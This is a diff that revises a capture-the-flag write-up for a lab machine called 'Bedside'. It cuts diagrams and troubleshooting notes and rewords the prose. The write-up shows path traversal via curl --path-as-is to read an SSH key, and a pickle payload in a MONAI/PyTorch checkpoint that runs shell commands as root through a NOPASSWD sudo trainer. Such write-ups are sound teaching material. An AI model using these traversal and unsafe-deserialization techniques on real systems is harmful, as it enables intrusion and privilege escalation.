@@ -182,12 +182,6 @@ datawrangler@data-wrangler:/app$ hostname
 data-wrangler
 ```
 
-<p align="center">
-  <img src="images/pdfminer-path.drawio.svg" width="850" alt="Diagram of the PDFMiner upload and deserialization path" />
-  <br/>
-  <em>Figure 1: Both files land in the upload directory. The PDF worker reads the PDF, follows its CMap reference, and deserializes the uploaded pickle as datawrangler.</em>
-</p>
-
 ## Inside the Data-Wrangler Container
 
 The filesystem that I connected to had `/.dockerenv`, so I could infer I was in a Docker container and not yet on the host. There were a couple files present in the `/app` directory that I could take a look at next:
@@ -231,7 +225,7 @@ Content-Type: text/html; charset=utf-8
 <title>Bedside Clinic - Image Viewer</title>
 ```
 
-The page was an MRI image viewer with hot module reloading (HMR), which was interesting. Its source referenced `/@hmr`, was able to find the process launches with `/usr/bin/esm.sh serve .`. I thought that since this was a deployment server (via this excerpt: `import createHotContext from "/@hmr";`), there could be some exposed functionalities. I tried a couple of normal file requests, but `/package.json` and `/.env` both returned 404.
+The page was an MRI image viewer with hot module reloading (HMR), which was interesting. Its source referenced `/@hmr`, was able to find the process launches with `/usr/bin/esm.sh serve .`. I thought that since this was a deployment server (due to `/@hmr` reference), there could be some exposed functionalities. I tried a couple of normal file requests, but `/package.json` and `/.env` both returned 404.
 
 I also tested if the development server would let me request files outside its web root. The important piece of information that progressed my attack was the `curl` flag `--path-as-is`, which keeps `../` segments intact instead of normalizing them (and thus providing an attack vector for directory traversal):
 
@@ -255,7 +249,7 @@ Uid:    1000 1000 1000 1000
 Gid:    1000 1000 1000 1000
 ```
 
-That same traversal gave me the **user flag**:
+Using the same traversal technique gave me the user flag:
 
 ```bash
 datawrangler@data-wrangler:/app$ curl -s --path-as-is \
@@ -288,12 +282,6 @@ developer
 developer@bedside:~$ hostname
 bedside
 ```
-
-<p align="center">
-  <img src="images/container-pivot.drawio.svg" width="850" alt="Diagram of the container to host pivot through port 3000" />
-  <br/>
-  <em>Figure 2: The container could reach the internal image viewer. A path traversal exposed developer's SSH key, which gave me an interactive shell on bedside.</em>
-</p>
 
 ## Privilege Escalation - Using the MONAI Trainer
 
@@ -333,15 +321,15 @@ loader(engine)
 
 This is where the two accounts fit together. **`developer` could launch the trainer as root, but couldn't read or write to `/datastore/checkpoints`**. I still had the docker shell for `datawrangler` open, and `datawranger` did have the ability to write there. The restricted account had access to the data, and the privileged process trusts that data. Combining the two will allow me root access.
 
-I checked the installed libraries: PyTorch `2.5.0+cpu`, MONAI `1.5.0`. Reading the implementation of `CheckpointLoader.__call__` revealed one line that mattered:
+I checked the installed libraries: PyTorch `2.5.0+cpu`, MONAI `1.5.0`. Reading into how `CheckpointLoader.__call__` is referenced revealed one line that mattered:
 
 ```python
 checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
 ```
 
-Unlike a restricted weights-only load, this permits unpickling objects that may execute Python code. I didn't need to change the root-owned trainer—I needed to make it load a file I controlled.
+Because this has weights-only set to false, this permits unpickling objects that may execute Python code. For this sudo code execution, I didn't need to change the trainer, I only needed to make it load a file that I control.
 
-There was one catch: the script **exits before loading a checkpoint if there are no training samples**. So I used my `datawrangler` shell to create a small valid PNG in `/datastore/processed/`. Then I placed a `.pt` checkpoint containing a malicious `data.pkl` in `/datastore/checkpoints/`. The complete construction is in [`scripts/build_checkpoint.py`](scripts/build_checkpoint.py); the essential payload was:
+There was one small issue stopping this: the script **exits before loading a checkpoint if there aren't any training samples**. I used my `datawrangler` shell to create a small PNG within `/datastore/processed/` to suffice this rule. I then placed a `.pt` checkpoint containing a malicious `data.pkl` in `/datastore/checkpoints/`. The construction I used is in [`scripts/build_checkpoint.py`](scripts/build_checkpoint.py) if you want to examine it. The important section of code from it is listed below:
 
 ```python
 class RootProof:
@@ -350,50 +338,33 @@ class RootProof:
         return (subprocess.check_output, (["/bin/sh", "-c", "id > /tmp/root-proof.txt"],))
 ```
 
-<p align="center">
-  <img src="images/checkpoint-privesc.drawio.svg" width="850" alt="Diagram of the writable checkpoint and root-run trainer" />
-  <br/>
-  <em>Figure 3: datawrangler supplies a training image and checkpoint through shared storage; developer's permitted sudo command makes root load the unsafe checkpoint.</em>
-</p>
+### Final Tweaks
 
-### Working through the last errors
-
-At first I ran the trainer with an extra `--epochs 1` argument, and `sudo` prompted for a password even though the listed permission was `NOPASSWD`. I dropped the extra argument and used the exact permitted command with `-n` to prevent an interactive password prompt:
-
-```bash
-developer@bedside:~$ sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
-2026-10-16 15:28:19 | INFO | Using 1 samples for training.
-2026-10-16 15:28:19 | INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_999.pt, loading with CheckpointLoader (callable mode)...
-TypeError: Argument checkpoint should be a string or a dictionary, but given <class 'bytes'>
-```
-
-The exception initially looked like failure. In reality, the command inside the checkpoint ran **during deserialization**, before MONAI tried to treat the result as a legitimate training checkpoint. The error came afterward.
-
-My first payload made a SUID copy of Bash at `/tmp/rootbash`. It was owned by root and had the SUID bit, but running it didn't elevate me because `/tmp` was mounted with `nosuid`:
+Putting all the pieces together, I began to execute my final attack. My first payload made a SUID copy of Bash at `/tmp/rootbash`. It was owned by root and had the SUID bit, but running it didn't elevate me because `/tmp` was mounted with `nosuid`:
 
 ```bash
 developer@bedside:~$ findmnt -no OPTIONS /tmp
 rw,nosuid,nodev,nr_inodes=1048576,inode64
 ```
 
-I changed the checkpoint payload to a simpler proof and reran the same sudo command:
+I changed the checkpoint payload to a simpler proof and reran it with the same sudo command, `/usr/bin/python3 /opt/trainer/bedside_trainer.py`:
 
 ```bash
 developer@bedside:~$ cat /tmp/root-proof.txt
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-That was the confirmation I needed: **the checkpoint executed with UID 0**, even though my interactive SSH session was still `developer`.
+I now had confirmation of root code execution. Even though my interactive SSH session was still `developer`, **The checkpoint executed with UID 0**.
 
 ## Root Flag
 
-For the final run, I replaced the checkpoint payload with a command to copy the root flag to a readable temporary file:
+Finally, I replaced the checkpoint payload with a command to copy the root flag to a readable temporary file:
 
 ```python
 command = "cp /root/root.txt /tmp/bedside-root-flag && chmod 644 /tmp/bedside-root-flag"
 ```
 
-I triggered the trainer again using the same allowed sudo command:
+I triggered the trainer once more and grabbed the root flag:
 
 ```bash
 developer@bedside:~$ sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
@@ -405,8 +376,6 @@ developer@bedside:~$ ls -l /tmp/bedside-root-flag
 developer@bedside:~$ cat /tmp/bedside-root-flag
 [redacted root flag]
 ```
-
-I had **both flags**. Something worth clarifying: I didn't finish inside an interactive root shell. I had proven **root command execution**, and I used that execution to retrieve the root flag. My SSH shell still belonged to `developer`. I could have used the same primitive to launch a root reverse shell, but it wasn't needed to complete the machine.
 
 ## Key Findings
 
